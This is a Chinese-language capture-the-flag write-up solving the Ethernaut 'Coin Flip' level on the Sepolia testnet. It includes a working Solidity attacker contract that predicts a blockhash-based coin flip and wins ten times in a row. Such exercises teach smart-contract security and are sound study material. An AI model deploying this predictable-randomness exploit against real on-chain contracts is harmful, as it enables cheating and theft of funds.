# level3 coin flip

## 1. 问题
要求是连续10次调用`CoinFlip`合约的flip函数，每次都需要猜测成功函数的执行结果。

```solidity
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## 2. 解法

因为合约是白盒，每次执行结果是可预期、可预测的，所以我们的思路就是创建一个合约，然后这个合约每次调用coinflip合约，在调用前，自己执行下同样的计算逻辑，算出来本次合约调用时结果是什么，然后调用flip函数时使用该结果。

因为合约中做了`lastHash`的记录和判断，所以我们如果在一次合约调用时，for循环连续调用flip函数10次，第二次开始，flip中的`lastHash == blockValue`判断就会拒绝执行。

1. 我们编写的合约如下：

```solidity
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Guess {
    CoinFlip private flip;

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _flip) {
        // 部署合约时绑定CoinFlip合约
        flip = CoinFlip(_flip);
    }
    
    function run() external {
        
        // 完全模仿flip函数，算一遍预期的正反面结果
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // 使用执行的结果调用flip
        bool guessSuccess = flip.flip(side);
        require(guessSuccess, "guess failed");
    }
}
```

2. 将上面的代码放到remix编译

3. 部署，输入CoinFlip合约地址作为入参，remix会唤起metamask[提交交易到sepolia](https://sepolia.etherscan.io/tx/0x5a0344ababcf99673eb4b576e2cb4290838c296332d2174a196b1b70b99ff0da)

4. 我们的Guess合约被部署到：[https://sepolia.etherscan.io/address/0x9cb0fd719a20f7dcc576845217d096614782e8e5](https://sepolia.etherscan.io/address/0x9cb0fd719a20f7dcc576845217d096614782e8e5)

5. 正式开始前，通过ethernaut控制台，确认项当前的次数，确认是0：
```bash
await contract.consecutiveWins().then(v => v.toString())
```

6. 通过remix调用`run`函数：[0xfa434890083a128c93e92046c938eec58040ced7bf050cdb0dd6f8bdd5370d7d](https://sepolia.etherscan.io/tx/0xfa434890083a128c93e92046c938eec58040ced7bf050cdb0dd6f8bdd5370d7d)

7. 通过ethernaut控制台，确认项当前的次数，确认已经更新到1了

8. 重复执行9次

9. 点击 `submit instance`， 提交通过！
